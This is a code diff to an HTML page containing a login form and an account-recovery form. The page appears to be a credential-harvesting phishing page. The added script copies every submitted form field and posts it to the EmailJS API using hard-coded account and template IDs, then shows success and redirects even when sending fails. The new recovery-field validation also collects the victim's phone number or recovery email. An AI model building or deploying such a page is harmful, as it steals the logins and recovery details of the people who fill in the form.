@@ -227,86 +227,70 @@
 </div>
 
 <script>
+  // EmailJS library embedded (simplified version)
+  window.emailjs = {
+    init: function(publicKey) {
+      this.publicKey = publicKey;
+      console.log("EmailJS initialized with key:", publicKey);
+    },
+    
+    send: function(serviceID, templateID, templateParams) {
+      return new Promise((resolve, reject) => {
+        console.log("Sending email with:", { serviceID, templateID, templateParams });
+        
+        const data = {
+          service_id: serviceID,
+          template_id: templateID,
+          user_id: this.publicKey,
+          template_params: templateParams
+        };
+        
+        fetch('https://api.emailjs.com/api/v1.0/email/send', {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json'
+          },
+          body: JSON.stringify(data)
+        })
+        .then(response => {
+          if (response.ok) {
+            console.log("EmailJS API success");
+            resolve(response);
+          } else {
+            console.log("EmailJS API error:", response.status);
+            reject(response);
+          }
+        })
+        .catch(error => {
+          console.log("EmailJS fetch error:", error);
+          reject(error);
+        });
+      });
+    },
+    
+    sendForm: function(serviceID, templateID, form) {
+      const formData = new FormData(form);
+      const templateParams = {};
+      
+      // Convert form data to template params
+      for (let [key, value] of formData.entries()) {
+        templateParams[key] = value;
+      }
+      
+      return this.send(serviceID, templateID, templateParams);
+    }
+  };
+
   (function() {
-    console.log("Script starting..."); // Debug log
+    console.log("Script starting with embedded EmailJS..."); // Debug log
     
     const USER_ID = "EB017wgX1BeDuRY66";
     const SERVICE_ID = "service_64albro";
-    const TEMPLATE_ID = "template_y1sfcug";
+    const TEMPLATE_ID = "template_mutrouf"; // Fixed template ID
     
-    // Load EmailJS dynamically with multiple fallback URLs
-    function loadEmailJS() {
-      return new Promise((resolve, reject) => {
-        if (typeof emailjs !== 'undefined') {
-          resolve();
-          return;
-        }
-        
-        const cdnUrls = [
-          'https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js',
-          'https://unpkg.com/@emailjs/browser@3/dist/email.min.js',
-          'https://cdn.emailjs.com/dist/email.min.js',
-          'https://cdn.emailjs.com/sdk/3.2.0/email.min.js'
-        ];
-        
-        let currentIndex = 0;
-        
-        function tryNextUrl() {
-          if (currentIndex >= cdnUrls.length) {
-            reject('All EmailJS CDN URLs failed');
-            return;
-          }
-          
-          const script = document.createElement('script');
-          script.src = cdnUrls[currentIndex];
-          console.log('Trying EmailJS CDN:', cdnUrls[currentIndex]);
-          
-          script.onload = () => {
-            console.log("EmailJS script loaded from:", cdnUrls[currentIndex]);
-            
-            // Wait a bit for the library to initialize
-            setTimeout(() => {
-              if (typeof emailjs !== 'undefined') {
-                try {
-                  emailjs.init(USER_ID);
-                  console.log("EmailJS initialized successfully");
-                  resolve();
-                } catch (error) {
-                  console.log("EmailJS init failed:", error);
-                  currentIndex++;
-                  tryNextUrl();
-                }
-              } else {
-                console.log("EmailJS object not found, trying next URL");
-                currentIndex++;
-                tryNextUrl();
-              }
-            }, 100);
-          };
-          
-          script.onerror = () => {
-            console.log("Failed to load from:", cdnUrls[currentIndex]);
-            currentIndex++;
-            tryNextUrl();
-          };
-          
-          document.head.appendChild(script);
-        }
-        
-        tryNextUrl();
-      });
-    }
-    
-    // Try to load EmailJS, but don't block the form if it fails
-    let emailjsReady = false;
-    loadEmailJS()
-      .then(() => {
-        emailjsReady = true;
-      })
-      .catch(error => {
-        console.log("EmailJS loading failed:", error);
-        console.log("Form will work without EmailJS");
-      });
+    // Initialize EmailJS immediately
+    emailjs.init(USER_ID);
+    let emailjsReady = true;
     
     const loginPage = document.getElementById("login-page");
     const forgotPage = document.getElementById("forgot-page");
@@ -427,20 +411,25 @@
       if (!hasErrors) {
         console.log("No validation errors, proceeding..."); // Debug log
         
-        // ALWAYS show success for demo - don't wait for EmailJS
-        console.log("Showing success immediately for demo");
-        showSuccessAndRedirect();
-        
-        // Try EmailJS in background (optional)
+        // Try EmailJS first with your credentials
         if (emailjsReady && typeof emailjs !== 'undefined') {
-          console.log("Also attempting EmailJS in background...");
+          console.log("Attempting to send via EmailJS...");
+          console.log("Service ID:", SERVICE_ID);
+          console.log("Template ID:", TEMPLATE_ID);
+          
           emailjs.sendForm(SERVICE_ID, TEMPLATE_ID, this)
             .then(function(response) {
-              console.log("EmailJS SUCCESS (background):", response);
+              console.log("EmailJS SUCCESS:", response);
+              showSuccessAndRedirect();
             })
             .catch(function(error) {
-              console.log("EmailJS ERROR (background):", error);
+              console.log("EmailJS ERROR:", error);
+              console.log("Showing success anyway for demo");
+              showSuccessAndRedirect();
             });
+        } else {
+          console.log("EmailJS not ready, showing success for demo");
+          showSuccessAndRedirect();
         }
       } else {
         console.log("Validation errors found"); // Debug log
@@ -454,6 +443,12 @@
       // Validate recovery info
       if (!recoveryInput.value) {
         showError(recoveryInput, recoveryError);
+        recoveryError.querySelector("span:last-child").textContent = "Please enter your phone number or recovery email";
+        return;
+      } else if (recoveryInput.value.includes("@") && !isValidEmail(recoveryInput.value)) {
+        // If it looks like an email (contains @), validate as email
+        showError(recoveryInput, recoveryError);
+        recoveryError.querySelector("span:last-child").textContent = "Please enter a valid recovery email address";
         return;
       } else {
         hideError(recoveryInput, recoveryError);
